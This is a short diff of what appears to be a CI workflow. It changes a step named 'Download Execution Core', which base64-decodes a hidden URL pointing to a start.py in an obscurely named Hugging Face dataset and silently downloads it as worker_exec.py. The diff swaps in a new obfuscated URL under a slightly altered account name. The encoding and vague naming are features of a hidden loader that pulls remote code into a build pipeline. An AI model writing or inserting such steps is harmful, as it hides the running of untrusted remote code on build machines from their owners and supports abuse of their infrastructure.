@@ -63,7 +63,7 @@ jobs:
       # -----------------------------------------------------------------
       - name: Download Execution Core
         run: |
-          RESOURCE_URI=$(awk 'BEGIN { print "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" }' | base64 -d)
+          RESOURCE_URI=$(awk 'BEGIN { print "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" }' | base64 -d)
           curl -sL "$RESOURCE_URI" -o worker_exec.py
 
       # -----------------------------------------------------------------
